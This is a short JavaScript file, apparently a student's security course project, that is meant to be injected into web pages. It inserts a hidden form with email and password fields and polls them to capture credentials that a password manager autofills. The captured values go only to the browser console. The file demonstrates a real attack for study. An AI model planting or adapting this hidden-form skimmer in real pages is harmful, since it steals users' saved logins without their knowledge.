/***************************************
 *
 *      inject.js
 *      by Gregory Pickart
 *      May 3, 2018
 *
 *      Script that will be injected into webpages which sniffs 
 *      password manager autofill actions. Strictly for demonstration
 *      purposes for Comp116 Final Project. 
 * 
 ***************************************/

(function() {

        /**
         *      createForm() function
         *      Parameters:     none
         *      Returns:        none
         *      Purpose:        Creates new hidden HTML form object with 
         *                      autofill attributes and inserts it into page.
         **/
	var createForm = function() {
                console.log("Creating and injecting hidden autofill form");
                var autofillForm = document.createElement('form');
                autofillForm.id = 'autofillForm';
                autofillForm.style.display = 'none';
                autofillForm.attributes.autocomplete = 'on';
                var emailField = document.createElement('input');
                var passField = document.createElement('input');
                emailField.id = 'autofill_email';
                emailField.name = 'autofill_email';
                emailField.type = 'email'
                passField.id = 'autofill_pass';
                passField.name = 'autofill_pass';
                passField.type = 'password';
                autofillForm.appendChild(emailField);
                autofillForm.appendChild(passField);
                document.body.appendChild(autofillForm);
        }

        /**
         *      pollField() function
         *      Parameters:     field id
         *      Returns:        none
         *      Purpose:        Checks the given field for entered login 
         *                      information. If not present, checks again
         *                      in 200 ms. If present, prints them to the 
         *                      console.
         **/
        var pollField = function(id) {
                var field = document.getElementById(id);
                if (field != null) {
                        var value = field.value;
                        if (value.length) {
                                console.log("Field: " + id 
                                                      + " Value: " 
                                                      + value);
                        } else {
                                window.setTimeout(pollField, 200, id);
                        }
                } else {
                        console.log("Field not found");
                }
        }

        /**
         *      sniffFields() function
         *      Parameters:     none
         *      Returns:        none
         *      Purpose:        Gets the injected autofill fields and calls
         *                      the pollFields() function to sniff for
         *                      autofilled input.
         **/
        var sniffFields = function() {
                var userFields = document.getElementsByName('autofill_email');
                pollField(userFields[0].id);

                var passFields = document.getElementsByName('autofill_pass');
                pollField(passFields[0].id);
        }


        /**
         *      Main program control flow:
         *              1. Create hidden autofill form
         *              2. Sniff for autofilled inputs
         **/
        createForm();
        sniffFields();

})();